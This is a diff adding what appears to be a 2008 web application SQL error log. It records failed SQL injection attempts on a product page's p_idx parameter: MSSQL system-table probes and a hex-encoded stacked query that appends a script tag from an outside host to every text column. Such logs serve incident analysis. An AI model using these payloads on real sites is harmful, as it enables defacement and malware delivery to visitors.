@@ -1,0 +1,762 @@
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 and rp_rank > 0 and rp_r' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+and now() between B.star' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+and A.shop_idx = 
+and no' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+update tblProduct set p_view = p_view + 1 where p_idx = 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\' and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\'
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\'
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+update tblProduct set p_view = p_view + 1 where p_idx = 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\' and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\'
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\'
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:29] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+update tblProduct set p_view = p_view + 1 where p_idx = 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
